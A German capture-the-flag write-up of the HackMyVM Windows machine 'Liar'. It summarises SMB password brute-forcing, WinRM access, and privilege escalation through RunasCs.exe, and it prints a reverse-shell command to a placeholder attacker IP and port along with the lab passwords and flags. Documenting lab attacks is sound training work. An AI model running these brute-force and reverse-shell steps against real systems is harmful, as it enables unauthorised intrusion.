# Liar - HackMyVM (Easy)

![Liar.png](Liar.png)

## Übersicht

*   **VM:** Liar
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Liar)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2023-10-01
*   **Original-Writeup:** https://alientec1908.github.io/Liar_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Administrator-Rechte auf der Windows-Maschine "Liar" zu erlangen. Der initiale Zugriff erfolgte durch Brute-Forcing von SMB-Credentials für den Benutzer `nica`, nachdem auf der Webseite ein Hinweis auf diesen Benutzer gefunden wurde. Mit den Credentials wurde eine WinRM-Shell als `nica` erlangt. Die erste Rechteausweitung zum Benutzer `akanksha` gelang durch weiteres Brute-Forcing von SMB-Credentials für `akanksha` und anschließende Ausführung einer Reverse Shell mittels des Tools `RunasCs.exe` (als `nica` hochgeladen). Da `akanksha` Mitglied der Gruppe "Administratoren" war, hatte die erhaltene Shell administrative Rechte, was das Auslesen der Root-Flagge ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nikto`
*   `nmap`
*   `smbclient`
*   `evil-winrm`
*   `crackmapexec`
*   `unzip`
*   `python3 http.server`
*   `Start-BitsTransfer` (PowerShell)
*   `RunasCs.exe`
*   `nc` (netcat)
*   Standard Windows-Befehle (`cat`, `dir`, `cd`, `whoami`, `net user`, `type`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Liar" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   IP-Adresse des Ziels (192.168.2.135) mit `arp-scan` identifiziert.
    *   `/etc/hosts`-Eintrag für `liar.hmv` hinzugefügt.
    *   `nikto`-Scan auf Port 80 identifizierte einen `Microsoft-IIS/10.0`-Server.
    *   `nmap`-Scan bestätigte ein Windows-System mit offenen Ports 80 (HTTP), 135 (msrpc), 139 (netbios-ssn) und 445 (microsoft-ds).

2.  **Web Enumeration & Credential Gathering (SMB Brute-Force):**
    *   Auf der Webseite `http://liar.hmv/` wurde eine Nachricht vom Ersteller "nica" gefunden, was "nica" als potenziellen Benutzernamen markierte.
    *   `crackmapexec` wurde verwendet, um SMB-Credentials für den Benutzer `nica` zu bruteforcen. Das Passwort `hardcore` wurde gefunden.

3.  **Initial Access (WinRM als `nica`):**
    *   Mit `evil-winrm` wurde eine PowerShell-basierte Remote-Shell als `nica` mit dem Passwort `hardcore` auf dem Zielsystem etabliert.
    *   Die User-Flagge (`HMVWINGIFT`) wurde in `C:\Users\nica\user.txt` gefunden.
    *   `net user` zeigte die Existenz der Benutzer `akanksha` und `Administrador`.

4.  **Privilege Escalation (von `nica` zu `akanksha`):**
    *   `crackmapexec` wurde erneut verwendet, um SMB-Credentials für den Benutzer `akanksha` zu bruteforcen. Das Passwort `sweetgirl` wurde gefunden.
    *   Ein direkter WinRM-Login als `akanksha` schlug aufgrund von Autorisierungsfehlern fehl.
    *   Das Tool `RunasCs.exe` wurde auf das Angreifer-System heruntergeladen und entpackt.
    *   `RunasCs.exe` wurde über einen Python-HTTP-Server bereitgestellt und mittels `Start-BitsTransfer` (in der `nica`-WinRM-Shell) auf das Zielsystem nach `C:\Users\nica\` heruntergeladen.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet (Port 4545).
    *   In der `nica`-Shell wurde `.\RunasCs.exe akanksha sweetgirl cmd.exe -r ANGRIFFS_IP:4545` ausgeführt.
    *   Eine Reverse Shell wurde auf dem Listener empfangen, die als Benutzer `akanksha` lief.

5.  **Privilege Escalation (von `akanksha` zu Administrator):**
    *   In der `akanksha`-Shell bestätigte `net user akanksha`, dass der Benutzer Mitglied der Gruppe `Administradores` ist.
    *   Die erhaltene Shell hatte somit administrative Rechte.
    *   Die Root-Flagge (`HMV1STWINDWZ`) wurde in `C:\Users\Administrador\Desktop\root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Schwache SMB-Passwörter:** Die Passwörter für die Benutzer `nica` (`hardcore`) und `akanksha` (`sweetgirl`) konnten mittels Brute-Force über SMB erraten werden.
*   **Informationspreisgabe auf Webseite:** Ein Hinweis auf einen gültigen Benutzernamen (`nica`) wurde direkt auf der Webseite gegeben.
*   **Ausführung von Tools als anderer Benutzer:** Das Tool `RunasCs.exe` ermöglichte die Ausführung von Befehlen im Kontext eines anderen Benutzers (hier `akanksha`), dessen Credentials bekannt waren, auch wenn ein direkter Login (z.B. via WinRM) für diesen Benutzer nicht erlaubt war.
*   **Fehlende Zugriffsbeschränkungen für WinRM (implizit):** Obwohl `akanksha` sich nicht direkt per WinRM anmelden konnte, war WinRM für `nica` offen und ermöglichte das Hochladen und Ausführen von Tools.
*   **Überprivilegierter Benutzer:** Der Benutzer `akanksha` war Mitglied der Gruppe `Administradores`, was nach erfolgreicher Kompromittierung dieses Kontos direkten administrativen Zugriff gewährte.

## Flags

*   **User Flag (`C:\Users\nica\user.txt`):** `HMVWINGIFT`
*   **Root Flag (`C:\Users\Administrador\Desktop\root.txt`):** `HMV1STWINDWZ`

## Tags

`HackMyVM`, `Liar`, `Easy`, `Windows`, `SMB Brute-Force`, `WinRM`, `RunasCs`, `Privilege Escalation`, `IIS`
